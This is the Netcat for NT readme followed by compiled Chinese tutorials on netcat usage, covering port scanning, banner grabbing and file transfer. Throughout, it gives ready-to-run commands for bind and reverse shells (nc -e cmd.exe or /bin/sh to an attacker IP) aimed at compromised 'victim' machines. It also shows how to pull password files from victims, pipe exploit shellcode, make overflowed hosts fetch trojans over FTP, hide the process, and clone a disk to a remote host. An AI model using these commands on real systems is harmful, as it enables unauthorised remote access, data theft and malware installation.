Update 2011-09-17 - added -c option to send CRLF


UPDATE 12/27/04 security fix in -e option for Windows

Netcat 1.11 for NT - nc111nt.zip

The original version of Netcat was written by *hobbit* <hobbit@avian.org>
The NT version was done by Weld Pond <weld@vulnwatch.org>

Netcat for NT is the tcp/ip "Swiss Army knife" that never made it into any 
of the resource kits.  It has proved to be an extremely versatile tool on 
the unix platform. So why should NT always be unix's poor cousin when it 
comes to tcp/ip testing and exploration?  I bet many NT admins out there
keep a unix box around to use tools such as Netcat or to test their systems
with the unix version of an NT vulnerability exploit.  With Netcat for NT
part of that feeling disempowerment is over.

Included with this release is Hobbit's original description of the powers 
of Netcat.  In this document I will briefly describe some of the things an
NT admin might want to do and know about with Netcat on NT.  For more
detailed technical information please read hobbit.txt included in the
nc11nt.zip archive.

     Basic Features

     * Outbound or inbound connections, TCP or UDP, to or from any ports
     * Full DNS forward/reverse checking, with appropriate warnings
     * Ability to use any local source port
     * Ability to use any locally-configured network source address
     * Built-in port-scanning capabilities, with randomizer
     * Can read command line arguments from standard input
     * Slow-send mode, one line every N seconds
     * Hex dump of transmitted and received data
     * Ability to let another program service established
       connections
     * Telnet-options responder

     New for NT

     * Ability to run in the background without a console window
     * Ability to restart as a single-threaded server to handle a new
       connection


A simple example of using Netcat is to pull down a web page from a web
server.  With Netcat you get to see the full HTTP header so you can see
which web server a particular site is running.

Since NT has a rather anemic command processor, some of the things that are
easy in unix may be a bit more clunky in NT. For the web page example first
create a file get.txt that contains the following line and then a blank
line:

GET / HTTP/1.0

To use Netcat to retrieve the home page of a web site use the command:
nc -v www.website.com 80 < get.txt

You will see Netcat make a connection to port 80, send the text contained
in the file get.txt, and then output the web server's response to stdout.
The -v is for verbose.  It tells you a little info about the connection
when it starts.

It is a bit easier to just open the connection and then type at the console
to do the same thing. 
nc -v www.website.com 80

Then just type in GET / HTTP/1.0 and hit a couple of returns.  You will 
see the same thing as above.

A far more exciting thing to do is to get a quick shell going on a remote
machine by using the -l or "listen" option and the -e or "execute"
option.  You run Netcat listening on particular port for a connection.
When a connection is made, Netcat executes the program of your choice
and connects the stdin and stdout of the program to the network connection.

nc -l -p 23 -t -e cmd.exe

will get Netcat listening on port 23 (telnet).  When it gets connected to
by a client it will spawn a shell (cmd.exe).  The -t option tells Netcat
to handle any telnet negotiation the client might expect.

This will allow you to telnet to the machine you have Netcat listening on
and get a cmd.exe shell when you connect.  You could just as well use 
Netcat instead of telnet:

nc xxx.xxx.xxx.xxx 23

will get the job done.  There is no authentication on the listening side
so be a bit careful here.  The shell is running with the permissions of the
process that started Netcat so be very careful.  If you were to use the
AT program to schedule Netcat to run listening on a port with the 
-e cmd.exe option, when you connected you would get a shell with user
NT AUTHORITY\SYSTEM.

The beauty of Netcat really shines when you realize that you can get it
listening on ANY port doing the same thing.  Do a little exploring and
see if the firewall you may be behind lets port 53 through.  Run Netcat
listening behind the firewall on port 53.  

nc -L -p 53 -e cmd.exe

Then from outside the firewall connect to the listening machine:

nc -v xxx.xxx.xxx.xx 53

If you get a command prompt then you are executing commands on the
listening machine.  Use 'exit' at the command prompt for a clean
disconnect. The -L (note the capital L) option will restart Netcat with
the same command line when the connection is terminated.  This way you can
connect over and over to the same Netcat process.

A new feature for the NT version is the -d or detach from console flag.
This will let Netcat run without an ugly console window cluttering up the
screen or showing up in the task list.

You can even get Netcat to listen on the NETBIOS ports that are probably
running on most NT machines.  This way you can get a connection to a
machine that may have port filtering enabled in the TCP/IP Security Network
control panel.  Unlike Unix, NT does not seem to have any security around
which ports that user programs are allowed to bind to.  This means any
user can run a program that will bind to the NETBIOS ports.

You will need to bind "in front of" some services that may already be
listening on those ports.  An example is the NETBIOS Session Service that
is running on port 139 of NT machines that are sharing files.  You need
to bind to a specific source address (one of the IP addresses of the 
machine) to accomplish this.  This gives Netcat priority over the NETBIOS
service which is at a lower priority because it is bound to ANY IP address.
This is done with the Netcat -s option:

nc -v -L -e cmd.exe -p 139 -s xxx.xxx.xxx.xxx

Now you can connect to the machine on port 139 and Netcat will field
the connection before NETBIOS does.  You have effectively shut off
file sharing on this machine by the way.  You have done this with just
user privileges to boot.

PROBLEMS with Netcat 1.1 for NT

There are a few known problems that will eventually be fixed.  One is
the -w or timeout option.  This works for final net reads but not
for connections.  Another problem is using the -e option in UDP mode.
You may find that some of the features work on Windows 95.  Most
of the listening features will not work on Windows 95 however.   These will
be fixed in a later release.

Netcat is distributed with full source code so that people can build
upon this work.  If you add something useful or discover something 
interesting about NT TCP/IP let met know.

Weld Pond <weld@l0pht.com>, 2/2/98

参数介绍：

nc.exe -h即可看到各参数的使用方法。
基本格式：nc [-options] hostname port[s] [ports] ...
nc -l -p port [options] [hostname] [port]

-d 后台模式
-e prog 程序重定向，一旦连接，就执行 [危险!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h 帮助信息
-i secs 延时的间隔
-l 监听模式，用于入站连接
-L 连接关闭后,仍然继续监听
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-p port 本地端口号
-r 随机本地及远程端口
-s addr 本地源地址
-t 使用TELNET交互方式
-u UDP模式
-v 详细输出--用两个-v可得到更详细的内容
-w secs timeout的时间
-z 将输入输出关掉--用于扫描时

端口的表示方法可写为M-N的范围格式。

基本用法：

大概有以下几种用法：

1)连接到REMOTE主机，例子：
格式：nc -nvv 192.168.x.x 80
讲解：连到192.168.x.x的TCP80端口


2)监听LOCAL主机，例子：
格式：nc -l -p 80
讲解：监听本机的TCP80端口


3)扫描远程主机，例子：
格式：nc -nvv -w2 -z 192.168.x.x 80-445
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口


4)REMOTE主机绑定SHELL，例子：
格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口


5)REMOTE主机绑定SHELL并反向连接，例子：
格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口


以上为最基本的几种用法（其实NC的用法还有很多，
当配合管道命令“|”与重定向命令“<”、“>”等等命令功能更强大......）。

高级用法：

6)作攻击程序用，例子：
格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80
格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt
讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)

附：c:exploit.txt为shellcode等


7)作蜜罐用[1]，例子：
格式：nc -L -p 80
讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止.


8)作蜜罐用[2]，例子：
格式：nc -L -p 80 > c:log.txt
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。

附：c:log.txt为日志等

9)作蜜罐用[3]，例子：
格式1：nc -L -p 80 < c:honeypot.txt
格式2：type.exe c:honeypot.txt|nc -L -p 80
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。

第一个:nc -l -v -p 7626 
这就是打开本地的7626端口进行监听，并反馈连接信息这样如果有扫描冰河木马的人会认为你中了木马开放了7626，和“小猪快跑”的功能有点象，再加个批处理文件一起用的话就是一个“小猪快跑”了
如果要监视是否有入侵本地80端口的行为，并记下来，用这个命令： 
nc -l -p 80 >>c:\\日志.dat 
这样，凡是有针对本机80端口的攻击都会被记录下来的

二、如果你通过溢出进入了别人的机器，就可以运行： 
nc -l -p 123 -e cmd.exe 
或者是: nc -l -p 123 -t 
作用都是以cmd.exe来响应到机器上123端口的连接 
这样就把溢出的主机变成了一台telnet肉鸡了啊 
你也可以用命令让肉鸡主动连接你的主机,假设我的IP是192.168.0.1 
在肉鸡上运行： nc -e cmd.exe 192.168.0.1 777 
再在本地机器上运行： nc -l -p 777 
意思是让肉鸡将cmd.exe(就是个shell)主动响应到你电脑的777端口 
你再在本地机上监听777端口，这样就进入了对方的cmd了 
这也微十时毫 反弹端口式木马的原理了。

三、用这个命令： 
nc -v 192.168.0.25 80 
就获得了192.168.0.25的80端口的信息 
可以获得IIS版本等很多重要信息的

四、 你也可以将NC作为扫描器使用： 
nc -v -z 192.168.0.25 1-100 
扫描192.168.0.25的1到100间的TCP端口
用nc -v -z -u 192.168.0.25 1-100 
这是扫描1到00间的UDP端口
 
3.1.端口的刺探：
nc -vv ip port 
RIVER [192.168.0.198] 19190 (?) open //显示是否开放open

3.2.扫描器
nc -vv -w 5 ip port-port port 
nc -vv -z ip port-port port
　　这样扫描会留下大量的痕迹，系统管理员会额外小心。

3.3. 后门
victim machine: //受害者的机器 
nc -l -p port -e cmd.exe //win2000 
nc -l -p port -e /bin/sh //unix,linux 
attacker machine: //攻击者的机器. 
nc ip -p port //连接victim_IP,然后得到一个shell。

3.4.反向连接 
attacker machine: //一般是sql2.exe,远程溢出,webdavx3.exe攻击. 
//或者wollf的反向连接. 
nc -vv -l -p port 
victim machine: 
nc -e cmd.exe attacker ip -p port 
nc -e /bin/sh attacker ip -p port
或者：
attacker machine: 
nc -vv -l -p port1  
nc -vv -l -p prot2  
victim machine: 
nc attacker_ip port1 | cmd.exe | nc attacker_ip port2 
nc attacker_ip port1 | /bin/sh | nc attacker_ip port2
139要加参数-s（nc.exe -L -p 139 -d -e cmd.exe -s 对方机器IP），这样就可以保证nc.exe优先于NETBIOS。

3.5.传送文件：

3.5.1 attacker machine <-- victim machine //从肉鸡拖密码文件回来. 
nc -d -l -p port < path\filedest 　　　 可以shell执行 
nc -vv attacker_ip port > path\file.txt 需要Ctrl+C退出 
//肉鸡需要gui界面的cmd.exe里面执行(终端登陆,不如安装FTP方便).否则没有办法输入Crl+C.

3.5.2 attacker machine --> victim machine //上传命令文件到肉鸡 
nc －vv -l -p port > path\file.txt　　　　　 需要Ctrl+C退出 
nc -d victim_ip port < path\filedest 　 可以shell执行 
//这样比较好.我们登陆终端.入侵其他的肉鸡.可以选择shell模式登陆.

3.6 端口数据抓包.
nc -vv -w 2 -o test.txt xfocus.net 80 21-15
< 00000058 35 30 30 20 53 79 6e 74 61 78 20 65 72 72 6f 72 # 500 Syntax error 
< 00000068 2c 20 63 6f 6d 6d 61 6e 64 20 22 22 20 75 6e 72 # , command "" unr 
< 00000078 65 63 6f 67 6e 69 7a 65 64 2e 0d 0a # ecognized... 
< 00000084 83 00 00 01 8f # .....

3.7 telnet,自动批处理。
nc victim_ip port < path\file.cmd 　 显示执行过程. 
nc -vv victim_ip port < path\file.cmd 　 显示执行过程.
nc -d victim_ip port < path\file.cmd 安静模式.

【本地运行】nc -v ip port

【命令解释】扫瞄某 IP 的某个端口，返回信息详细输出。

===================================================================

【本地运行】nc -v -z ip port-port

【命令解释】扫描某IP的端口到某端口，返回信息详细输出，但扫描速度较慢。

===================================================================

【本地运行】nc -v -z -u ip  port-port

【命令解释】扫描某 IP 的某 UDP 端口到某 UDP 端口，返回信息详细输出，但扫描速度较慢。

===================================================================

【本地运行】nc -l -p 80 

【命令解释】开启本机的 TCP 80 端口并监听。

===================================================================

【本地运行】nc -l -v -p 80

【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到当前 CMD 窗口。

===================================================================

【本地运行】nc -l -p 80 > E:/log.dat

【命令解释】开启本机的 TCP 80 端口并将监听到的信息输出到 E:/log.dat 下的日志文件里。

===================================================================

【本地运行】nc -nvv 192.168.1.101 80 

【命令解释】连接到192.168.1.101主机的 80 端口。

===================================================================

【本地运行】nc -nvv -w2 -z 192.168.1.101 80-1024 

【命令解释】扫锚192.168.1.101的80-1024端口，连接超时时间为2秒。

=================================================================

【远程运行】nc -l -p 2012 -t -e cmd.exe

【本地运行】nc -nvv 192.168.1.101 2012

【命令解释】采用正向连接方式，远程主机（注：假设IP地址为 192.168.1.101）上运行 nc -l -p 2012 -t -e cmd.exe 意为绑定远程主机的 CMD 到

【命令解释】2012 端口，当本地主机连接远程主机成功时就会返回给本地主机一个CMD Shell ；在本地主机上运行 nc -nvv 192.168.1.101 2012 用于

【命令解释】连接已经将 CMD 重定向到 2012 端口的远程主机（注：假设IP地址为 192.168.1.101）。

=================================================================

【本地运行】nc -l -p 2012

【远程运行】nc -t -e cmd.exe 192.168.1.102 2012

【命令解释】采用反向连接方式，先在本地主机运行 nc -l -p 2012 开启本地主机的（注：假设IP地址为 192.168.1.102）2012 端口并监听等待远程主

【命令解释】机连接；在远程主机上运行 nc -t -e cmd.exe 192.168.1.102 2012 将远程主机的 CMD 重定向到 IP 地址为 192.168.1.102 端口号为

【命令解释】2012 的主机上，连接成功后 IP 地址为 192.168.1.102 的主机会得到一个CMD Shell。

=================================================================

【本地运行】nc -v -n ip port < C:/sunzn.exe

【远程运行】nc -v -l -p port > D:/sunzn.exe

【命令解释】在本地运行 nc -v -n ip port < C:/sunzn.exe 意为从本地 C 盘根目录中读取 sunzn.exe 文件的内容，并把这些数据发送到远程主机的

【命令解释】对应端口上（注：命令行中的 IP 为接收文件的远程主机 IP ），在远程主机运行 nc -v -l -p port > D:/sunzn.exe 意为监听对应端口并

【命令解释】把接收到的信息数据写到 D:/sunzn.exe 中，两行命令实现了文件在本地主机和远程主机间的传输。

=================================================================

【本地运行】nc -L -p 8989<C:\ftp.txt （ ftp.txt 中为FTP自动下载命令）

【命令解释】不停地监听 8989 端口，并把 C:\ftp.txt  中的内容发给任何一台连接本机 8989 端口的主机，可起到传送文件作用（此用法经常用于反向

【命令解释】溢出）。溢出远程主机时，一旦溢出的远程主机连接本地主机 8989 端口，远程主机就会自动用 FTP 下载指定的文件，如木马。

=================================================================

写一篇简单一点的使用教程：　

命令1：监听命令

nc -l -p port
nc -l -p port > e:\log.dat
nc -l -v -p port

参数解释：

-l：监听端口，监听入站信息
-p：后跟本地端口号
-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信息

提示：一般大家都爱用-vv

nc -l -p 80

这个很简单，监听80端口
如果机器上运行这个命令，端口80被认为是开放的，可以欺骗扫描器

nc -l -p 80 > e:\log.dat

将详细信息写入E盘log.dat的日志文件

nc -l -v -p 80

和上边命令相似，会直接显示信息在运行着NC的屏幕上。

实践：

例如：nc -l -v -p 80

然后在浏览器中输入本机IP：127.0.0.1

 

命令2：程序定向（反弹shell的方法）

nc -l -p port -t -e cmd.exe

本地机： nc -l -p port 或 nc -l -v -p port

目标机：nc -e cmd.exe ip port

参数解释：

-l、-p两个参数已经解释过了

-e；作用就是程序定向
-t：以telnet的形式来应答

例子

nc -l -p 5277 -t -e cmd.exe

千万不要运行在自己的机器上，如果运行了，你机器就会变成一台TELNET的服务器了。

命令解释为：监听本地端口5277的入站信息，同时将CMD.exe这个程序，重定向到端口5277上，当有人连接的时候，就让程序CMD.exe以TELNET的形式来响应连接要求。

说白了，其实就是让他成为一台TELNET的肉鸡，所以这个命令要运行在你的肉鸡上。


例如用法：

local machine：nc -l -p port ( or nc -l -v -p port )
remote machine：nc -e cmd.exe ip port


大家知道灰鸽子和神偷吧，这两款工具都是利用了反弹端口型的木马，
什么叫反弹端口？

就是说，当对方中马后，不用你主动和对方连接，也就是说不用从你的client端向对方主机上运行的server端发送请求连接，而是对方主动来连接你这样就可以使很多防火墙失效，因为很多防火墙都不检查出站请求的。这里这两个命令结合在一起后，于那两款木马可以说有异曲同工之效。

本地运行：nc -l -p 5277 （监听本地5277端口）或者 nc -l -v -p 5277

然后在远程机器上，想办法运行 nc -e cmd.exe ip 5277

（你可别真的打“ip”在肉鸡上啊）要打，xxx.xxx.xxx.xxx这样！！

这样就是反弹~~在本地机器上得到了一个SHELL

命令3：扫描端口

nc -v ip port
nc -v -z ip port-port
nc -v -z -u ip port-port

参数解释：

-z：将输入输出关掉，在扫描时使用

nc -v ip port

这个命令是针对某一个端口进行扫描

例如：

nc -v ip 135

扫描远程主机的135端口，这样获得了该端口的一些简单信息，但是针对某些端口，我们还可以获得更多的信息

例如：80端口

我们可以使用nc -v ip 80 然后使用get方法来获得对方的WEB服务器的信息


nc -v -z ip port-port

这个命令是用来扫描的一个命令，这个命令用于快速扫描TCP端口，而port-port则是指定了扫描的端口范围

例如：

nc -v -z ip 1-200

可以看到我机器上的1-200的TCP端口的开放情况


nc -v -z -u ip port-port

这个命令比上个命令多了个-u，这个命令的作用仍然是扫描端口，只是多了一个-u的参数，是用来扫UDP端口的

例如：

nc -v -z -u ip 1-200

这个命令就会扫1-200的UDP端口

命令4：传送文件（HOHO，I LIKE）

LOCAL MACHINE：nc -v -n ip port < x:\svr.exe
REMOTE MACHINE：nc -v -l -p port > y:\svr.exe

参数解释：

-n：指定数字的IP地址

这两个命令结合起来是用来传送文件的

首先，在远程机上运行命令：

nc -v -l -p 5277 > c:\pulist.exe

这个命令还记的吗？呵呵，是不是和监听命令有点类似，对，没错，这个是监听5277端口

并把接受到的信息数据写到c:\pulist.exe中


这时候在本地机上运行

nc -v -n ip 5277 < e:\hack\pulist.exe

这个命令的意思就是，从本地E盘跟目录中读取pulist.exe文件的内容，并把这些数据发送到ip的5277端口上

这样远程主机就会自动创建一个pulist.exe文件。

0x08 远程克隆硬盘

如果目标系统整处于运行状态则可以收集其内存信息，进程信息，文件系统，网络连接等。通过远程电子取证，可以将目标服务器硬盘或者内存远程复制。
A端接收端:

nc -lp 333 | dd of=/dev/sda
B端，目标服务器:

dd if=/dev/sda | nc -nv 192.168.14.21 333 -q 1 
使用dd命令对目标服务器进行块级别的复制，以便进行数据还原因为此时文件级别的复制已经没有意义！[if=inputfile]

作者：onejustone
链接：https://www.jianshu.com/p/af6766e428ec
來源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

反向连接
nc -lp 333
nc -nv 127.0.0.1 333 -e cmd

正向连接
nc -nv 127.0.0.1 333 -e cmd
nc -nv 127.0.0.1 333

传输目录

nc本身并不支持目录传送，而是必须结合其它的命令来完成。通常先将目录进行打包，让后将其通过管道灌到nc的一个端口，让后在接收端通过nc去连接服务器已经打开的侦听端口，当接收端得到打包的文件后在通过tar去解包重新还原出目录。

命令演示如下:

$ tar -cvf - filename/ | nc -lp 333 -q 1     {先打包目录，前一个tar打包命令的结果通过管道成为nc命令的输入，即将tar过的文件传到333端口里面，等人家来连接 }
$ nc 192.168.14.20 333 | tar -xvf -   {将接收到tar文件重定向后进行解包}

传输文件

A作为接受端打开端口
$ nc -lp 3333 > 1.mp4  {将侦听到的3333端口的信息输出到1.mp4文件中}
B端为发送端:

$ nc -nv 1.1.1.1 3333 < 1.mp4 -q 1  {将1.mp4文件的内容宿儒到目标ip的3333端口，传递完成一秒后断开连接}
或者A作为发送端打开端口:
$ nc -q 1 -lp 3333 <a.mp4  -q 1 {将文件放在3333端口下，等着别人来下载,文件传输完成后1秒断开连接}
B作为接收端:

$ nc -nv 1.1.1.1 333 >a.mp4

作者：onejustone
链接：https://www.jianshu.com/p/af6766e428ec
來源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。